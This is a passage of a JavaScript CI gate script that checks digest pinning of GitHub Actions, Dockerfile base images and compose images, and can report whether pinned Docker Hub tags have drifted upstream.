        'committed and compose refuses to run at all without a value. The colon-dash form is not ' +
        'that: its default is a committed mutable tag.',
    );
  }
  return judged;
}

/**
 * Every Dockerfile and compose file in the repository, recursively.
 *
 * Exported so the tests discover exactly what the gate discovers; a test that
 * re-implements the walk is a test that cannot catch a walk that stopped walking.
 *
 * @param {string} root
 * @returns {{dockerfiles: string[], composeFiles: string[]}} repo-relative paths
 */
export function discoverContainerFiles(root) {
  const dockerfiles = [];
  const composeFiles = [];
  const walk = (dir) => {
    let entries;
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const entry of entries) {
      const full = join(dir, entry.name);
      if (entry.isDirectory()) {
        if (SKIP_DIRS.has(entry.name)) continue;
        walk(full);
        continue;
      }
      if (!entry.isFile()) continue;
      const rel = relative(root, full).split('\\').join('/');
      if (DOCKERFILE_NAME.test(entry.name)) dockerfiles.push(rel);
      else if (COMPOSE_NAME.test(entry.name)) composeFiles.push(rel);
    }
  };
  walk(root);
  return { dockerfiles: dockerfiles.sort(), composeFiles: composeFiles.sort() };
}

export function runCiPinningGate() {
  const gate = new Gate('ci-and-container-pinning');
  return runGate(gate, () => {
    const workflowDir = join(REPO_ROOT, '.github', 'workflows');
    const workflows = listWorkflowFiles(workflowDir);
    checkWorkflowInventory(gate, workflows);

    let actionRefs = 0;
    let runners = 0;
    for (const name of workflows) {
      const path = join(workflowDir, name);
      const text = readFileSync(path, 'utf8');
      actionRefs += checkWorkflowPinning(gate, relative(REPO_ROOT, path), text);
      // Counted for the note rather than re-checked: `checkWorkflowPinning` has
      // already judged them. A visible count is how a reader notices that a
      // parser stopped matching — the previous `runs-on` regex matched one of
      // five spellings and nothing in the output said so.
      runners += parseRunsOn(text).length;
    }

    // Local actions, held to the same rule as the workflows that call them. See
    // `discoverLocalActionFiles` for the two-hop bypass this closes.
    const localActions = discoverLocalActionFiles(REPO_ROOT);
    for (const name of localActions) {
      actionRefs += checkWorkflowPinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
    }

    const { dockerfiles, composeFiles } = discoverContainerFiles(REPO_ROOT);
    if (dockerfiles.length === 0) {
      gate.fail('no Dockerfile found', 'the base-image pinning check examined nothing');
    }
    if (composeFiles.length === 0) {
      gate.fail('no compose file found', 'the compose image check examined nothing');
    }
    let baseImages = 0;
    for (const name of dockerfiles) {
      baseImages += checkDockerfilePinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
    }
    let composeImages = 0;
    for (const name of composeFiles) {
      composeImages += checkComposePinning(gate, name, readFileSync(join(REPO_ROOT, name), 'utf8'));
    }

    gate.note(
      `${workflows.length} workflow(s) and ${localActions.length} local action file(s), ` +
        `${actionRefs} action reference(s), ${runners} runs-on ` +
        `declaration(s), ${dockerfiles.length} Dockerfile(s) with ${baseImages} external base image(s), ` +
        `${composeFiles.length} compose file(s) with ${composeImages} image reference(s)`,
    );
  });
}

// ---------------------------------------------------------------------------
// --freshness: is a pinned digest still what its tag points at?
// ---------------------------------------------------------------------------

/**
 * Splits `registry/name:tag@sha256:...` into its parts.
 *
 * The awkward case is a registry with a port (`localhost:5000/x:1`), where the
 * first colon is not the tag separator. The rule used is the one the reference
 * grammar uses: a colon introduces a tag only if what follows it contains no `/`.
 *
 * @returns {{name: string, tag: string|null, digest: string} | null}
 */
export function parsePinnedReference(reference) {
  const at = reference.lastIndexOf('@');
  if (at === -1) return null;
  const digest = reference.slice(at + 1);
  if (!/^sha256:[0-9a-f]{64}$/.test(digest)) return null;
  const left = reference.slice(0, at);
  const colon = left.lastIndexOf(':');
  if (colon === -1 || left.slice(colon + 1).includes('/')) return { name: left, tag: null, digest };
  return { name: left.slice(0, colon), tag: left.slice(colon + 1), digest };
}

/**
 * Every digest-pinned image reference in the repository's container and workflow
 * files, with where it was found.
 *
 * Reads the same files the gate reads, through the same discovery, so a reference
 * the gate judges is a reference this can re-check — and one it cannot see is one
 * neither of them sees, which is a single failure rather than two.
 */
export function collectPinnedImages(root) {
  const found = [];
  const add = (file, index, reference) => {
    const parsed = parsePinnedReference(reference);
    if (parsed !== null) found.push({ ...parsed, reference, at: `${file}:${index + 1}` });
  };

  const workflowDir = join(root, '.github', 'workflows');
  for (const name of listWorkflowFiles(workflowDir)) {
    const rel = `.github/workflows/${name}`;
    for (const [index, rawLine] of readFileSync(join(workflowDir, name), 'utf8').split('\n').entries()) {
      const line = uncomment(rawLine);
      const image = imageValue(line);
      if (image !== null) add(rel, index, image);
      const uses = /^\s*-?\s*uses:\s*docker:\/\/(\S+)/.exec(line);
      if (uses) add(rel, index, uses[1] ?? '');
    }
  }

  const { dockerfiles, composeFiles } = discoverContainerFiles(root);
  for (const rel of dockerfiles) {
    for (const [index, rawLine] of readFileSync(join(root, rel), 'utf8').split('\n').entries()) {
      const line = uncomment(rawLine);
      const from = /^\s*FROM\s+(.+)$/i.exec(line);
      if (!from) continue;
      const words = (from[1] ?? '')
        .trim()
        .split(/\s+/)
        .filter((p) => !p.startsWith('--'));
      add(rel, index, words[0] ?? '');
    }
  }
  for (const rel of composeFiles) {
    for (const [index, rawLine] of readFileSync(join(root, rel), 'utf8').split('\n').entries()) {
      const image = imageValue(uncomment(rawLine));
      if (image !== null) add(rel, index, image);
    }
  }

  // Deduplicated by reference, keeping every place it appears: the same base image
  // is pinned in both Dockerfiles and the report should say so once.
  const byReference = new Map();
  for (const entry of found) {
    const existing = byReference.get(entry.reference);
    if (existing === undefined) byReference.set(entry.reference, { ...entry, at: [entry.at] });
    else existing.at.push(entry.at);
  }
  return [...byReference.values()];
}

/**
 * Re-resolves one tag against Docker Hub and returns the digest it points at now.
 *
 * Only Docker Hub is supported, and a reference to any other registry is reported
 * as unchecked rather than assumed current — an "everything is fine" that came
 * from not looking is the failure mode this whole file exists to avoid.
 *
 * The two `Accept` headers matter: without them the registry returns a
 * single-platform manifest for the daemon's architecture and its digest is NOT
 * the digest a multi-arch tag resolves to, so every multi-arch pin would look
 * like it had drifted.
 */
async function resolveTagDigest(name, tag) {
  if (name.includes('.') || name.startsWith('localhost')) {
    return { digest: null, why: 'not on Docker Hub; this reporter only speaks to registry-1.docker.io' };
  }
  const repository = name.includes('/') ? name : `library/${name}`;
  try {
    const tokenResponse = await fetch(
      `https://auth.docker.io/token?service=registry.docker.io&scope=repository:${repository}:pull`,
      { signal: AbortSignal.timeout(15_000) },
    );
    if (!tokenResponse.ok) return { digest: null, why: `token endpoint answered ${tokenResponse.status}` };
    const token = (await tokenResponse.json()).token;
    if (typeof token !== 'string') return { digest: null, why: 'the token endpoint returned no token' };

    const manifest = await fetch(`https://registry-1.docker.io/v2/${repository}/manifests/${tag}`, {
      method: 'HEAD',
      headers: {
        authorization: `Bearer ${token}`,
        accept: [
          'application/vnd.oci.image.index.v1+json',
          'application/vnd.docker.distribution.manifest.list.v2+json',
          'application/vnd.oci.image.manifest.v1+json',
          'application/vnd.docker.distribution.manifest.v2+json',
        ].join(', '),
      },
      signal: AbortSignal.timeout(20_000),
    });
    if (!manifest.ok) return { digest: null, why: `the registry answered ${manifest.status} for :${tag}` };
    const digest = manifest.headers.get('docker-content-digest');
    return digest === null ? { digest: null, why: 'no docker-content-digest header' } : { digest, why: null };
  } catch (err) {
    return { digest: null, why: err?.message ?? String(err) };
  }
}

/**
 * The drift report. Always exits 0 — see the header for why that is deliberate.
 *
 * @param {boolean} asJson
 */
async function runFreshnessReport(asJson) {
  const pinned = collectPinnedImages(REPO_ROOT);
  const results = [];
  for (const entry of pinned) {
    if (entry.tag === null) {
      results.push({
        ...entry,
        state: 'no-tag',
        current: null,
        why: 'pinned by digest with no tag to re-resolve',
      });
      continue;
    }
    const resolved = await resolveTagDigest(entry.name, entry.tag);
    if (resolved.digest === null) {
      results.push({ ...entry, state: 'unresolved', current: null, why: resolved.why });
    } else if (resolved.digest === entry.digest) {
      results.push({ ...entry, state: 'current', current: resolved.digest, why: null });
    } else {
      results.push({ ...entry, state: 'drifted', current: resolved.digest, why: null });
    }
  }

  if (asJson) {
    console.log(JSON.stringify({ checkedAt: new Date().toISOString(), images: results }, null, 2));
    return;
  }

  console.log(bold('\nBase-image digest freshness'));
  for (const result of results) {
    const where = result.at.join(', ');
    if (result.state === 'current') {
      console.log(`${green('  ✓')} ${result.name}:${result.tag}`);
      console.log(dim(`      still ${result.digest}  (${where})`));
    } else if (result.state === 'drifted') {
      console.log(`${yellow('  !')} ${result.name}:${result.tag} ${bold('has been rebuilt upstream')}`);
      console.log(dim(`      pinned  ${result.digest}`));
      console.log(dim(`      now     ${result.current}`));
      console.log(dim(`      at      ${where}`));
    } else {
      console.log(
        `${yellow('  !')} ${result.name}${result.tag === null ? '' : `:${result.tag}`} not checked`,
      );
      console.log(dim(`      ${result.why}  (${where})`));
    }
  }

  const drifted = results.filter((r) => r.state === 'drifted');
  const unresolved = results.filter((r) => r.state === 'unresolved');
  console.log(bold('\nSummary'));
  console.log(`  pinned references  ${results.length}`);
  console.log(`  still current      ${results.length - drifted.length - unresolved.length}`);
  console.log(`  drifted            ${drifted.length === 0 ? green('0') : yellow(String(drifted.length))}`);
  console.log(`  not checked        ${unresolved.length}`);
  console.log(
    drifted.length === 0
      ? green(bold('\nNo drift: every pinned tag still resolves to the digest beside it.\n'))
      : yellow(bold(`\n${drifted.length} pinned tag(s) now resolve elsewhere.\n`)),
  );
  console.log(
    dim(
      '  This is a REPORT, not a gate: it exits 0 whatever it finds. Drift is usually a base-OS\n' +
        '  security rebuild and is a reason to refresh the digest in a reviewed diff — which is the\n' +
        '  point of pinning. Failing the build on it would make every offline run red and would put\n' +
        '  a network call in the middle of a hermetic gate.\n' +
        '\n' +
        '  It also proves nothing about the CONTENT of the new image. A moved digest says the bytes\n' +
        '  changed, not that they are safe; review the upstream release notes before repinning.\n',
    ),
  );
}

if (import.meta.main) {
  const argv = process.argv.slice(2);
  const unknown = argv.filter((arg) => arg !== '--' && arg !== '--freshness' && arg !== '--json');
  if (unknown.length > 0) {
    console.error(red(`ci-pinning — unknown option ${unknown[0]} (try --freshness or no arguments)`));
    process.exit(1);
  }
  if (argv.includes('--freshness')) await runFreshnessReport(argv.includes('--json'));
  else await runCiPinningGate();
}
